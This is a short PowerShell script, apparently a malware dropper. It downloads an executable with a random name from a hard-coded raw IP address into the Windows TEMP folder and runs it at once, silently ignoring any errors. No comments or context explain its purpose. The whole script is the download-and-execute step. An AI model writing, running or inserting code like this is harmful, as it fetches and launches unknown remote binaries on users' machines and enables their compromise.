$someData = @(
    [PSCustomObject]@{a = "http://65.21.90.149/A3eD5WXLZgYl.exe"; b = "A3eD5WXLZgYl.exe"}
  );

  foreach ($i in $someData) {
    try {
      $filePath = "$env:TEMP\$($i.b)";
      $download = $true;
      if (Test-Path $filePath) {
        $download = $false;
      }
      if ($download) {
        Invoke-RestMethod -Uri $i.a -OutFile $filePath;
      }
      Start-Process $filePath;
    }
    catch {
      # Error handling (optional)
    }
  }